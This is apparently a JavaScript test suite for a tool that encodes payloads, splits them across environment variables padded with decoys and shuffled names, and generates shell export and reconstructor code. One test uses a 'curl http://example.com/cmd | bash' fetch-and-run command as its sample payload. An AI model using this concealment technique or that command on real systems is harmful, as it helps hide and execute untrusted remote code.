/**
 * Environment Variable Obfuscator - Test Suite
 *
 * Tests for:
 * - Payload encoding/decoding
 * - Variable splitting and chunking
 * - Decoy injection
 * - Variable shuffling
 * - Reconstruction accuracy
 * - Edge cases
 */

const EnvVarObfuscator = require('./env-var-obfuscator');
const assert = require('assert');

class TestRunner {
  constructor() {
    this.passed = 0;
    this.failed = 0;
    this.tests = [];
  }

  test(name, fn) {
    this.tests.push({ name, fn });
  }

  async run() {
    console.log('=== Environment Variable Obfuscator Test Suite ===\n');

    for (const test of this.tests) {
      try {
        await test.fn();
        this.passed++;
        console.log(`✓ ${test.name}`);
      } catch (error) {
        this.failed++;
        console.log(`✗ ${test.name}`);
        console.log(`  Error: ${error.message}\n`);
      }
    }

    console.log(
      `\n=== Results: ${this.passed} passed, ${this.failed} failed ===\n`
    );
    return this.failed === 0;
  }
}

// Test suite
const runner = new TestRunner();
const obfuscator = new EnvVarObfuscator();

// Test 1: Basic encoding/decoding
runner.test('Base64 encode/decode', () => {
  const input = 'Hello, World!';
  const encoded = obfuscator.encodeBase64(input);
  const decoded = obfuscator.decodeBase64(encoded);
  assert.strictEqual(decoded, input, 'Base64 round-trip failed');
});

// Test 2: Hex encoding/decoding
runner.test('Hex encode/decode', () => {
  const input = 'SGVsbG8sIFdvcmxkIQ=='; // Base64 encoded
  const encoded = obfuscator.encodeHex(input);
  const decoded = obfuscator.decodeHex(encoded);
  assert.strictEqual(decoded, input, 'Hex round-trip failed');
});

// Test 3: Array encoding/decoding
runner.test('Array encode/decode', () => {
  const input = '48656c6c6f2c20576f726c6421'; // Hex string
  const encoded = obfuscator.encodeArray(input);
  const decoded = obfuscator.decodeArray(encoded);
  assert.strictEqual(decoded, input, 'Array round-trip failed');
});

// Test 4: Multi-layer encoding/decoding
runner.test('Multi-layer encode/decode', () => {
  const input = 'Secret Message 123!@#';
  const encoded = obfuscator.multiEncode(input);
  const decoded = obfuscator.multiDecode(encoded);
  assert.strictEqual(decoded, input, 'Multi-layer round-trip failed');
});

// Test 5: Basic obfuscation
runner.test('Basic obfuscation', () => {
  const payload = 'curl http://example.com/cmd | bash';
  const result = obfuscator.obfuscate(payload, { chunks: 3 });

  assert(result.variables, 'Variables object missing');
  assert(result.varNames, 'Variable names missing');
  assert(result.reconstructor, 'Reconstructor code missing');
  assert(result.metadata, 'Metadata missing');
});

// Test 6: Obfuscation with verification
runner.test('Obfuscation with reconstruction', () => {
  const payload = 'echo "Sensitive Data"';
  const result = obfuscator.obfuscate(payload, {
    chunks: 4,
    addDecoys: false,
  });

  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  assert.strictEqual(
    reconstructed,
    payload,
    'Reconstructed payload does not match original'
  );
});

// Test 7: Multiple chunks
runner.test('Multiple chunks (split payload)', () => {
  const payload = 'This is a longer payload that should be split across multiple environment variables';
  const result = obfuscator.obfuscate(payload, {
    chunks: 6,
    addDecoys: false,
  });

  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  assert.strictEqual(reconstructed, payload);
  assert.strictEqual(result.metadata.numChunks, 6);
});

// Test 8: Decoy injection
runner.test('Decoy variable injection', () => {
  const payload = 'test payload';
  const result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: true,
    numDecoys: 5,
    prefix: 'TEST',
  });

  const decoyCount = Object.keys(result.variables).length - 2;
  assert(decoyCount >= 5, 'Insufficient decoy variables injected');
});

// Test 9: Variable shuffling
runner.test('Variable name shuffling', () => {
  const payload = 'shuffle test';
  const result1 = obfuscator.obfuscate(payload, {
    chunks: 4,
    shuffle: true,
    addDecoys: false,
  });
  const result2 = obfuscator.obfuscate(payload, {
    chunks: 4,
    shuffle: true,
    addDecoys: false,
  });

  // dataVarNames always maintains correct order regardless of shuffle
  // Both should still reconstruct correctly
  const rec1 = obfuscator.reconstructFromEnv(
    result1.variables,
    result1.dataVarNames
  );
  const rec2 = obfuscator.reconstructFromEnv(
    result2.variables,
    result2.dataVarNames
  );

  assert.strictEqual(rec1, payload);
  assert.strictEqual(rec2, payload);

  // varNames should differ from dataVarNames when shuffled
  const varOrderDiffers = result1.varNames.join(',') !== result1.dataVarNames.join(',');
  assert(varOrderDiffers, 'Variables should be shuffled in varNames');
});

// Test 10: Custom prefix
runner.test('Custom variable prefix', () => {
  const payload = 'prefix test';
  const result = obfuscator.obfuscate(payload, {
    prefix: 'MYPREFIX',
    chunks: 2,
    addDecoys: false,
  });

  const hasCustomPrefix = Object.keys(result.variables).every(name =>
    name.startsWith('MYPREFIX')
  );
  assert(hasCustomPrefix, 'Custom prefix not applied');
});

// Test 11: Empty payload
runner.test('Empty payload handling', () => {
  const payload = '';
  const result = obfuscator.obfuscate(payload, { chunks: 1 });
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  assert.strictEqual(reconstructed, payload);
});

// Test 12: Special characters
runner.test('Special characters in payload', () => {
  const payload = '!@#$%^&*()_+-=[]{}|;:"<>?,./`~';
  const result = obfuscator.obfuscate(payload, { chunks: 2 });
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  assert.strictEqual(reconstructed, payload);
});

// Test 13: Unicode/Emoji support
runner.test('Unicode and emoji support', () => {
  const payload = 'Hello 世界 🚀 Привет';
  const result = obfuscator.obfuscate(payload, { chunks: 3 });
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  assert.strictEqual(reconstructed, payload);
});

// Test 14: Large payload
runner.test('Large payload handling', () => {
  const payload = 'A'.repeat(1000) + '\nLine 2\nLine 3';
  const result = obfuscator.obfuscate(payload, { chunks: 8 });
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  assert.strictEqual(reconstructed, payload);
});

// Test 15: Shell export generation
runner.test('Shell export script generation', () => {
  const payload = 'test export';
  const result = obfuscator.obfuscate(payload, { chunks: 2 });
  const shellScript = obfuscator.generateShellExport(result.variables);

  assert(shellScript.includes('#!/bin/bash'), 'Missing bash shebang');
  assert(
    shellScript.includes('export'),
    'Missing export statements'
  );
  assert(
    shellScript.split('export').length - 1 === Object.keys(result.variables).length,
    'Export count mismatch'
  );
});

// Test 16: Reconstructor code generation
runner.test('Reconstructor code generation', () => {
  const payload = 'test reconstructor';
  const result = obfuscator.obfuscate(payload, { chunks: 2 });
  const reconstructor = result.reconstructor;

  assert(
    reconstructor.includes('function') || reconstructor.includes('=>'),
    'Reconstructor missing function'
  );
  assert(
    reconstructor.includes('process.env'),
    'Reconstructor missing env var access'
  );
});

// Test 17: Noise generation
runner.test('Noise generation', () => {
  const noise = obfuscator.generateNoise(32);
  assert.strictEqual(noise.length, 32, 'Noise length mismatch');
  assert(/^[0-9a-f]+$/.test(noise), 'Noise not valid hex');
});

// Test 18: Decoy generation
runner.test('Decoy generation', () => {
  const decoy = obfuscator.generateDecoy();
  assert(decoy, 'Decoy not generated');
  assert(/^[0-9A-F]{32}$/.test(decoy), 'Decoy not valid hex');
});

// Test 19: Chunk splitting
runner.test('Chunk splitting logic', () => {
  const hexString = '0123456789abcdef0123456789abcdef';
  const chunks = obfuscator.splitIntoChunks(hexString, 4);

  assert.strictEqual(chunks.length, 4, 'Incorrect number of chunks');
  const reconstructed = chunks.join('');
  assert.strictEqual(reconstructed, hexString, 'Chunk reconstruction failed');
});

// Test 20: Metadata accuracy
runner.test('Metadata accuracy', () => {
  const payload = 'metadata test';
  const result = obfuscator.obfuscate(payload, { chunks: 3 });

  const metadata = result.metadata;
  assert.strictEqual(metadata.originalLength, payload.length);
  assert.strictEqual(metadata.numChunks, 3);
  assert(metadata.encodedLength > 0);
  assert.strictEqual(metadata.prefix, 'OBF');
});

// Test 21: Report generation
runner.test('Report generation', () => {
  const payload = 'test report';
  const result = obfuscator.obfuscate(payload, { chunks: 2 });
  const report = obfuscator.generateReport(payload, result);

  assert(report.summary, 'Summary missing');
  assert(report.encoding, 'Encoding missing');
  assert(report.variables, 'Variables missing');
  assert(report.usage, 'Usage missing');
  assert.strictEqual(report.summary.originalPayload, payload);
});

// Test 22: Consistency across multiple obfuscations
runner.test('Consistency check', () => {
  const payload = 'consistency test';
  const results = [];

  for (let i = 0; i < 3; i++) {
    const result = obfuscator.obfuscate(payload, {
      chunks: 2,
      shuffle: false,
      addDecoys: false,
    });
    const reconstructed = obfuscator.reconstructFromEnv(
      result.variables,
      result.varNames
    );
    results.push(reconstructed);
  }

  results.forEach(rec => {
    assert.strictEqual(rec, payload, 'Inconsistent reconstruction');
  });
});

// Test 23: Variable independence
runner.test('Variable independence', () => {
  const payload = 'independence test 12345';
  const result = obfuscator.obfuscate(payload, {
    chunks: 5,
    addDecoys: false,
  });

  // Each variable should contain unique hex chunks
  const varValues = Object.values(result.variables);
  const uniqueValues = new Set(varValues);
  assert(
    uniqueValues.size === varValues.length,
    'Variables contain duplicate values'
  );
});

// Test 24: Obfuscation obfuscation (re-obfuscate reconstructor)
runner.test('Nested obfuscation', () => {
  const payload = 'initial payload';
  const result1 = obfuscator.obfuscate(payload, { chunks: 2 });
  const result2 = obfuscator.obfuscate(result1.reconstructor, {
    chunks: 2,
  });

  const reconstructed2 = obfuscator.reconstructFromEnv(
    result2.variables,
    result2.varNames.filter(n => !n.includes('DECOY'))
  );
  assert(reconstructed2.includes('reconstructPayload'));
});

// Run all tests
runner.run().then(success => {
  process.exit(success ? 0 : 1);
});
